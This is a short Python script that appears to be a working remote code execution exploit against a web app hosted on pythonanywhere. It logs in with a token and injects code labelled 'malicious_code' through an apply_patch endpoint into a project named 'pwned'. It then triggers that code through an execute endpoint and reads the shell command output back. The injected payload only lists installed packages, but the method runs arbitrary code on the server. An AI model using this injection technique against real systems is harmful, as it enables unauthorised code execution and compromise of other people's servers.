import requests, time
s = requests.Session()
s.post('https://mikeymike.pythonanywhere.com/login', data={'token': 'Mike'})
malicious_code = """
import os, subprocess
out = subprocess.run("pip3 list | grep antigravity", shell=True, capture_output=True)
with open("out7.txt", "w") as f:
    f.write(out.stdout.decode() + "\\nERR:\\n" + out.stderr.decode())
"""
s.post('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/apply_patch', json={"project": "pwned", "file": "main.py", "code": malicious_code})
s.get('https://mikeymike.pythonanywhere.com/api/projects/execute/pwned')
time.sleep(3)
r3 = s.get('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/get_raw_file?project=pwned&file=out7.txt')
print(r3.text)
